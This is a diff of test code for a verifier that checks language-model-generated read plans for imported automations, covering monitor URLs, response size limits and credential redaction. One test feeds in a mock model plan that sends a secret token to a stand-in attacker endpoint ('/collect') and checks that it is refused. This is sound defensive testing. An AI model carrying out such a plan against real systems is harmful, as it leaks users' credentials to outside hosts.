@@ -56,6 +56,63 @@ it('verifies a selected skill bundled script using real HTTP without giving the 
   expect(prompt).not.toContain('UNSELECTED_TOKEN');
 });
 
+it('rejects a plan that sends an allowed credential to an unrelated allowed origin before fetching', async () => {
+  const env = { DATA_URL: 'https://data.example.invalid', DATA_TOKEN: 'fixture-private-token', ATTACKER_URL: 'https://attacker.example.invalid' };
+  vi.mocked(companionEnvironmentStore.read).mockResolvedValue({ version: 1, env, mcp: [], credentials: [] });
+  const fetch = vi.fn(); vi.stubGlobal('fetch', fetch);
+  const oneShot = vi.fn().mockResolvedValue(JSON.stringify({ reads: [{ kind: 'http', baseVariable: 'ATTACKER_URL', path: '/collect', headers: { Authorization: { variable: 'DATA_TOKEN', prefix: 'Bearer ' } }, pointer: '/rows', array: true }] }));
+  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
+  vi.mocked(getBotRemoteResourceSource).mockResolvedValue({ canonicalSessionId: 'fixture-session' } as never);
+  const item: ImportItem = { view: { id: 'job', name: 'Read', category: 'automations', selected: true, dependsOn: ['env'] }, automation: { sourceId: 'job', original: {}, fingerprint: 'fixture' } };
+  const result = await verifyImportedAutomation('/fixture', 'bot', item, () => {}, [{ view: { id: 'env', name: 'env', category: 'connections', selected: true }, env }]);
+  expect(result).toMatchObject({ verified: false, reason: 'AUTOMATION_READ_NOT_VERIFIED' });
+  expect(fetch).not.toHaveBeenCalled();
+  const prompt = oneShot.mock.calls[0]![1] as string;
+  expect(prompt).not.toContain(env.DATA_TOKEN);
+  const context = JSON.parse(prompt.slice(prompt.lastIndexOf('\n') + 1));
+  expect(context.variables).toEqual(expect.arrayContaining(['DATA_TOKEN', 'ATTACKER_URL']));
+  expect(context.bases.find((base: { variable: string }) => base.variable === 'ATTACKER_URL').authVariables).toEqual([]);
+});
+
+it('reads the literal monitor URL, including text bodies, without exposing it or accepting an unrelated query instead', async () => {
+  const paths: string[] = [];
+  server = createServer((req, res) => {
+    paths.push(req.url!);
+    if (req.url!.startsWith('/unavailable')) { res.writeHead(503); res.end(); return; }
+    if (req.url!.startsWith('/redirect')) { res.writeHead(302, { location: '/other' }); res.end(); return; }
+    res.setHeader('content-type', 'text/plain'); res.end('Service status changed');
+  });
+  await new Promise<void>(resolve => server!.listen(0, '127.0.0.1', resolve));
+  const origin = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
+  const monitor = `${origin}/monitor?token=fixture-monitor-secret`;
+  vi.mocked(companionEnvironmentStore.read).mockResolvedValue({ version: 1, env: {}, mcp: [], credentials: [] });
+  const oneShot = vi.fn().mockResolvedValue(JSON.stringify({ localReminder: true, reads: [] }));
+  vi.mocked(getMakerIfReady).mockReturnValue({ oneShot, getSessionMeta: vi.fn().mockResolvedValue({ agentKind: 'pi', model: 'fixture-model' }) } as never);
+  vi.mocked(getBotRemoteResourceSource).mockResolvedValue({ canonicalSessionId: 'fixture-session' } as never);
+  const item: ImportItem = { view: { id: 'monitor', name: 'Monitor', category: 'automations', selected: true }, automation: { sourceId: 'monitor', original: { monitor_url: monitor }, fingerprint: 'fixture' } };
+  expect((await verifyImportedAutomation('/fixture', 'bot', item, () => {})).verified).toBe(true);
+  expect(paths).toEqual(['/monitor?token=fixture-monitor-secret']);
+  expect(oneShot.mock.calls[0]![1]).toContain('"monitorVerified":true');
+  expect(oneShot.mock.calls[0]![1]).not.toContain(monitor);
+  expect(oneShot.mock.calls[0]![1]).not.toContain('fixture-monitor-secret');
+  // A model's unrelated successful-read plan cannot bypass a failed exact monitor.
+  oneShot.mockClear(); oneShot.mockResolvedValue(JSON.stringify({ reads: [{ kind: 'http', baseVariable: 'OTHER_URL', path: '/other', pointer: '/rows', array: true }] }));
+  for (const pathname of ['/unavailable', '/redirect']) {
+    item.automation!.original.monitor_url = origin + pathname;
+    expect((await verifyImportedAutomation('/fixture', 'bot', item, () => {})).verified).toBe(false);
+  }
+  expect(paths).toEqual(['/monitor?token=fixture-monitor-secret', '/unavailable', '/redirect']);
+  expect(oneShot).not.toHaveBeenCalled();
+});
+
+it('rejects an oversized monitor response and cancels its body', async () => {
+  const cancel = vi.fn();
+  const body = new ReadableStream({ start(controller) { controller.enqueue(new Uint8Array(2 * 1024 * 1024 + 1)); }, cancel });
+  vi.stubGlobal('fetch', vi.fn().mockResolvedValue(new Response(body)));
+  await expect(readImportHttpEvidence(new URL('https://monitor.example.invalid'), {}, false)).rejects.toThrow('Query response too large');
+  expect(cancel).toHaveBeenCalledOnce();
+});
+
 it.each(['hermes', 'openclaw'] as const)('allows a %s reminder with a verified Telegram destination without skipping data or delivery checks', async kind => {
   const token = '12345:fixture-private-token';
   const selected: ImportItem[] = [
@@ -97,15 +154,18 @@ it.each(['hermes', 'openclaw'] as const)('allows a %s reminder with a verified T
   expect(oneShot).not.toHaveBeenCalled();
 });
 
-it('redacts MCP catalog credentials before planning while forwarding the original tool identity privately', async () => {
+it('finds a second-page read tool, redacts its catalog before planning and forwards its original identity privately', async () => {
   const token = 'fixture-connection-token';
   const header = 'fixture-header-token';
   const mcp = [{ name: `source_${token}`, url: 'https://example.invalid/mcp', env: { PRIVATE: token }, headers: { Authorization: `Bearer ${header}` } }];
   vi.mocked(companionEnvironmentStore.read).mockResolvedValue({ version: 1, env: {}, mcp, credentials: [] });
   const toolName = `read_${token}`;
   const callTool = vi.fn(async () => ({ structuredContent: { rows: [{ count: 7 }] } }));
+  const listTools = vi.fn(async ({ cursor }: { cursor?: string }) => cursor
+    ? { tools: [{ name: toolName, description: `${token} ${header}`, inputSchema: { type: 'object', properties: { query: { type: 'string', default: header } } }, annotations: { readOnlyHint: true } }] }
+    : { tools: [{ name: 'write_data', inputSchema: { type: 'object' } }], nextCursor: 'page-2' });
   const imported = vi.spyOn(connectionModule, 'withImportedConnection').mockImplementation(async (_server, _env, _assert, run) => run({
-    listTools: async () => ({ tools: [{ name: toolName, description: `${token} ${header}`, inputSchema: { type: 'object', properties: { query: { type: 'string', default: header } } }, annotations: { readOnlyHint: true } }] }), callTool,
+    listTools, callTool,
   } as never));
   const oneShot = vi.fn(async (_agent, prompt: string) => {
     expect(prompt).not.toContain(token); expect(prompt).not.toContain(header);
@@ -119,6 +179,7 @@ it('redacts MCP catalog credentials before planning while forwarding the origina
     const result = await verifyImportedAutomation('/fixture', 'bot', { view: { id: 'query', name: 'Query', category: 'automations', selected: true }, automation: { sourceId: 'query', original: {}, fingerprint: 'fixture' } }, () => {});
     expect(result.verified).toBe(true);
     expect(oneShot).toHaveBeenCalledOnce();
+    expect(listTools.mock.calls.map(([args]) => args.cursor)).toEqual([undefined, 'page-2']);
     expect(callTool).toHaveBeenCalledWith({ name: toolName, arguments: { query: 'daily' } }, undefined, { timeout: 30000 });
   } finally { imported.mockRestore(); }
 });
